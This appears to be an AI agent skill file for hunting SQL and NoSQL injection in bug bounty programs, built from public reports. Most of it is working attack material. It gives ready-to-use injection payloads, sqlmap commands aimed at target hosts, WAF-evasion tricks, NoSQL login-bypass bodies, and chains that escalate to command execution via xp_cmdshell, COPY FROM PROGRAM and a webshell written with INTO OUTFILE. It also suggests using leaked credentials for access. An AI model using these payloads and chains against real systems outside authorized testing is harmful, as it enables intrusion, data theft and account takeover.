---
name: hunt-sqli
description: Hunting skill for sqli vulnerabilities. Built from 8 public bug bounty reports. Use when hunting sqli on any target.
sources: github, hackerone_public
report_count: 8
---

## Crown Jewel Targets

SQL injection remains one of the highest-paying vulnerability classes in bug bounty because it directly threatens data confidentiality, integrity, and availability at scale.

**Highest-value targets:**
- **SaaS platforms with multi-tenant databases** — one injection can expose all customer data
- **E-commerce/payment systems** — PII, card data, transaction records
- **Search endpoints** — user-controlled input passed directly to queries (e.g., Rockstar Games `/search`)
- **Analytics/tracking subdomains** — often built fast, tested less (e.g., `sctrack.email.uber.com.cn`)
- **Third-party plugins on enterprise installs** — WordPress plugins, CMS extensions running on corporate domains (Uber's Huge IT Video Gallery)
- **Internal tooling exposed externally** — Apache Airflow, GitHub Enterprise, admin dashboards
- **NoSQL backends (MongoDB)** — often overlooked, same injection class, different syntax

**Asset types that pay most:**
- Production APIs with `/search`, `/filter`, `/sort`, `/report` parameters
- Subdomains with legacy stacks (`.cn`, `.co`, `.io` regional variants)
- Self-hosted open-source tools (Airflow, GitLab, Jenkins) on bounty scope
- Email tracking and analytics infrastructure

---

## Attack Surface Signals

**URL patterns that suggest injectable parameters:**
```
/search?q=
/filter?category=
/sort?by=&order=
/report?start_date=&end_date=
/api/v1/items?id=
/index.php?id=
/gallery?album_id=
/track?uid=&campaign=
?page=&limit=&offset=
```

**Response header signals:**
- `X-Powered-By: PHP` — likely MySQL/PostgreSQL backend
- `Server: Apache` + PHP — classic LAMP stack
- `X-Powered-By: Express` — possible MongoDB/NoSQL backend
- Database error messages leaking in responses (MySQL, PostgreSQL, MSSQL error strings)

**JavaScript patterns indicating dynamic query construction:**
```javascript
// Look for these in JS bundles
fetch(`/api/search?q=${userInput}`)
$.ajax({ url: '/filter?sort=' + param })
axios.get('/report?from=' + startDate + '&to=' + endDate)
```

**Tech stack signals:**
- WordPress sites with third-party plugins (check `/wp-content/plugins/`)
- Apache Airflow endpoints (`/admin/`, `/api/experimental/`)
- GitHub Enterprise (`/_graphql`, `/search`, `/api/v3/`)
- Node.js + MongoDB combinations (check for `$where`, `$regex` in request bodies)
- PHP applications returning verbose MySQL errors

**Content-type signals for NoSQL:**
- `Content-Type: application/json` bodies with nested object parameters
- Parameters accepting arrays: `param[]=value` or `{"key": {"$gt": ""}}`

---

## Step-by-Step Hunting Methodology

1. **Enumerate all input vectors** — Use Caido passive scan during normal app usage. Capture every parameter: GET, POST, JSON body, HTTP headers (User-Agent, Referer, X-Forwarded-For), cookies, path segments.

2. **Identify the tech stack** — Check response headers, error messages, job postings, Wappalyzer, BuiltWith. Determines which payloads to prioritize (MySQL vs PostgreSQL vs MongoDB).

3. **Baseline the response** — Note normal response length, status code, and response time for a clean request. This is your diff baseline.

4. **Send error-based probes** — Inject single quote `'`, double quote `"`, backtick `` ` ``, and observe for:
   - Database error messages (immediate confirmation)
   - Response length change
   - HTTP 500 errors

5. **Test boolean-based blind** — Send true/false conditions and compare responses:
   - `param=1 AND 1=1` vs `param=1 AND 1=2`
   - If responses differ → likely injectable

6. **Test time-based blind** — When no visible difference exists:
   - MySQL: `param=1 AND SLEEP(5)`
   - PostgreSQL: `param=1; SELECT pg_sleep(5)--`
   - MSSQL: `param=1; WAITFOR DELAY '0:0:5'--`
   - Measure response time delta > 5 seconds = confirmed

7. **For NoSQL (MongoDB)** — Test object injection via JSON body and PHP-style array params:
   - Replace string value with `{"$gt": ""}` in JSON
   - Try `param[$ne]=invalid` in query strings

8. **Automate confirmation** — Run `sqlmap` on confirmed candidates with `--level=3 --risk=2` to enumerate databases without manual effort.

9. **Escalate impact** — Attempt:
   - `UNION`-based extraction (enumerate columns first)
   - `INFORMATION_SCHEMA` dump
   - File read/write (`LOAD_FILE`, `INTO OUTFILE`) if permissions allow
   - Stacked queries for RCE (MSSQL `xp_cmdshell`)

10. **Document the full chain** — Capture Caido Replay request/response, sqlmap output, and proof of data extraction (non-sensitive fields only for report).

---

## Payload & Detection Patterns

**Initial Error-Based Probes:**
```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 1=1#
admin'--
```

**Boolean-Based Blind:**
```sql
' AND 1=1--   (true condition)
' AND 1=2--   (false condition)
' AND SUBSTRING(version(),1,1)='5'--
1 AND (SELECT COUNT(*) FROM users) > 0--
```

**Time-Based Blind:**
```sql
-- MySQL
' AND SLEEP(5)--
1; SELECT SLEEP(5)--

-- PostgreSQL  
'; SELECT pg_sleep(5)--
1 AND (SELECT 1 FROM pg_sleep(5))--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--

-- SQLite
' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))))==1--
```

**UNION-Based (enumerate columns first):**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 10--   (find column count via error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

**NoSQL Injection (MongoDB):**
```javascript
// JSON body injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"$where": "this.username == this.password"}

// Query string injection
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=.*&password[$regex]=.*
```

**PHP Hash/Array Injection:**
```
# Replace scalar with array
param[key]=value
param[$gt]=0
param[$ne]=null
```

**Grep patterns for JS source hunting:**
```bash
# Find unsanitized query construction in JS
grep -r "query\s*+=" src/
grep -r "WHERE.*\+" src/
grep -r "\.find({" src/ | grep -v "sanitize\|escape"
grep -rE "db\.query\(.*\+" src/
```

**curl time-based detection:**
```bash
# Baseline
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"

# Inject
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"

# SQLMap quick scan
sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch

# SQLMap with POST
sqlmap -u "https://target.com/api/filter" --data="category=electronics&sort=price" --dbs --batch

# SQLMap with cookie auth
sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --batch --level=5
```

**Caido Automate payload list for column enumeration:**
```
§1§
§1§,§1§
§1§,§1§,§1§
§1§,§1§,§1§,§1§
```

---

## Common Root Causes

1. **String concatenation instead of parameterized queries** — The #1 root cause. Developers build SQL strings with user input directly: `"SELECT * FROM items WHERE id=" + userId`.

2. **ORMs bypassed for "performance"** — Developer switches from safe ORM to raw query for complex joins or reports: `db.query("SELECT " + userColumn + " FROM table")`.

3. **Search/filter functionality** — Sorting and filtering logic is notoriously hard to parameterize (column names can't be bound), leading to allowlist bypasses or no protection at all.

4. **Third-party plugin/library vulnerabilities** — Developers trust installed plugins (WordPress, Joomla extensions) without auditing their query logic (Uber's Huge IT Video Gallery case).

5. **Legacy codebases** — Old PHP 4/5 code predating PDO/MySQLi prepared statements, still running in production on acquired assets or regional subdomains.

6. **Internal tools promoted to external** — Tools like Apache Airflow were designed for internal use with minimal security hardening, then exposed to authenticated external users.

7. **NoSQL false sense of security** — Developers believe "we use MongoDB so no SQL injection" and skip input validation entirely, enabling object/operator injection.

8. **Insufficient escaping of ORDER BY / GROUP BY** — These clauses cannot use bound parameters, so developers escape manually (and often incorrectly).

9. **HTTP header and non-obvious inputs** — `User-Agent`, `Referer`, `X-Forwarded-For` stored in DB without sanitization, assuming they're "trusted" server-side values.

---

## Bypass Techniques

**WAF Bypass Techniques:**

*Keyword obfuscation:*
```sql
-- Space substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FROM users
%09SELECT%09username%09FROM%09users  (tab)
SELECT%0Ausername%0AFROM%0Ausers    (newline)

-- Case variation
SeLeCt UsErNaMe FrOm UsErS
sElEcT username fRoM users

-- Comment injection
SE/**/LECT username FR/**/OM users
/*!SELECT*/ username /*!FROM*/ users  (MySQL version comments)
/*!50000SELECT*/ username FROM users
```

*Encoding bypasses:*
```
URL encode: %27 = '  %20 = space  %23 = #
Double URL encode: %2527 = %27 = '
Unicode: ʼ (U+02BC) as quote substitute
HTML entity (in reflected contexts): &#39;
```

*Operator substitution:*
```sql
-- Avoid "OR" and "AND"
' || '1'='1
' && '1'='1
UNION ALL SELECT  (instead of UNION SELECT)
```

*Function substitution:*
```sql
-- When SLEEP is blocked
BENCHMARK(10000000,MD5(1))
GET_LOCK('a',5)
-- When UNION is blocked
INTO OUTFILE  (different extraction method)
```

*Header-based injection to avoid URL WAFs:*
```bash
curl -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" https://target.com/
curl -H "User-Agent: test' AND SLEEP(5)--" https://target.com/
curl -H "Referer: https://evil.com/' AND SLEEP(5)--" https://target.com/
```

*JSON/NoSQL WAF bypass:*
```json
{"username": {"$\u0067t": ""}}
{"user\u006eame": {"$gt": ""}}
```

*Authentication bypass for "authenticated-only" injection (Airflow pattern):*
- Obtain low-privilege account (free tier, trial, leaked creds)
- Inject via authenticated endpoints — WAFs often whitelist authenticated traffic

*Chunked transfer encoding to bypass body inspection:*
```
Transfer-Encoding: chunked
(split payload across chunks to evade WAF reassembly)
```

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Must be able to demonstrate at least one of:
- Extract database version/name via error message or UNION
- Prove time-delay control (5s sleep with `SLEEP(5)`, confirmed by timing)
- Extract a row from `information_schema.tables`
- Bypass authentication via boolean injection
- For NoSQL: bypass login or extract collection data

If the only evidence is an error message change with no data extraction or timing proof, it may be informational only (like Report 1 — rated Low).

**2. What does the victim LOSE?**
Must identify specific data at risk:
- PII (names, emails, passwords, addresses)
- Authentication credentials or session tokens
- Business data (transactions, proprietary records)
- Ability to exfiltrate to attacker-controlled server

A generic "database could be read" without identifying what database/table contains sensitive data weakens the report significantly.

**3. Can it be reproduced in 10 minutes from scratch?**
Must have:
- Single curl command or Caido Replay request that demonstrates the vulnerability
- No dependency on specific session state that expires immediately
- SQLMap tamper script or manual payload that consistently triggers the behavior
- Screen recording or step-by-step that a triage engineer can follow without your help

If you need more than one account, special timing, or race conditions to reproduce — document all prerequisites explicitly before submitting.

---

## Real Impact Examples

**Scenario A — Regional Subdomain, Legacy Stack (Uber sctrack pattern)**
An email tracking subdomain (`sctrack.email.[company].com.cn`) built on a legacy PHP stack accepted a `uid` parameter for tracking email opens. The parameter was concatenated directly into a MySQL query. Using a time-based blind payload, an unauthenticated attacker could enumerate the entire database schema, extract email campaign recipient lists including PII, and potentially pivot to internal infrastructure. Regional subdomains are often managed by local teams with lower security maturity and outside the primary WAF perimeter — making them consistently high-yield targets.

**Scenario B — Third-Party Plugin on Enterprise Domain (Uber WordPress plugin pattern)**
A company's marketing site ran WordPress with the Huge IT Video Gallery plugin. The plugin's `album_id` parameter was unparameterized. Because the site shared database credentials with other services, exploitation could reach beyond the WordPress installation. This illustrates the plugin supply chain risk: the parent company's bug bounty scope included the domain, but the vulnerable code was entirely third-party. Hunting WordPress plugins means auditing installed plugins against known CVEs AND testing for novel injections in their parameters — the enterprise brand amplifies the payout even when the root cause is a $20 plugin.

**Scenario C — Authenticated Internal Tool Exposed Externally (Airflow pattern)**
Apache Airflow's web interface, deployed for workflow orchestration and accessible to authenticated users, contained SQL injection in a filter/search parameter within the admin UI. Because Airflow often runs with database superuser credentials (it needs to manage its own metadata DB), exploitation by any authenticated user — including low-privilege accounts — could lead to full database read/write access and potentially OS-level command execution via `COPY TO/FROM` or similar DB features. The lesson: "authenticated-only" does not mean "safe" — internal tools have weak authorization models and often over-privileged DB connections.

---

## Related Skills & Chains

- **`hunt-rce`** — A SQLi against a DB user with `FILE`, `xp_cmdshell`, or `COPY FROM PROGRAM` privileges is an RCE primitive, not just a data-read. Chain primitive: MSSQL union-based SQLi → `EXEC xp_cmdshell 'whoami'` → RCE as `NT AUTHORITY\SYSTEM`; Postgres SQLi with `pg_read_server_files` or `COPY ... FROM PROGRAM 'id'` → RCE; MySQL SQLi with `FILE` → write webshell to web-root via `INTO OUTFILE`.
- **`hunt-idor`** — Once SQLi gives you arbitrary read on the users table, you have the IDs/UUIDs needed to enumerate IDOR endpoints at scale. Chain primitive: blind SQLi extracts `users.uuid` column → feed UUIDs into `/api/users/{uuid}/profile` → confirmed mass IDOR-with-PII rather than a theoretical broken-access-control.
- **`hunt-auth-bypass`** — Classic `' OR 1=1 --` in login forms or session tables is auth-bypass-via-SQLi. Chain primitive: SQLi on the `password_reset_tokens` table → read or insert a token row for `admin@target.com` → ATO without ever seeing the original password.
- **`security-arsenal`** — Reach for the SQLi payload tree (WAF-bypass union variants `/**/UnIoN/**/SeLeCt/**/`, MSSQL `WAITFOR DELAY '0:0:10'`, MySQL `SLEEP(10)`, Postgres `pg_sleep(10)`, Oracle `DBMS_PIPE.RECEIVE_MESSAGE`, NoSQLi `{"$ne": null}` / `{"$where": "sleep(5000)"}`, second-order via stored-then-rendered fields).
- **`triage-validation`** — Apply the Reproducibility Gate before reporting. A 200ms delta on a sleep-10 payload is noise, not blind SQLi. Require statistical evidence (5 trials at 0s vs 5 trials at 10s, non-overlapping confidence intervals) or an OOB DNS callback with a unique marker. The hunt-sqli internal sentinel/baseline pattern exists for exactly this.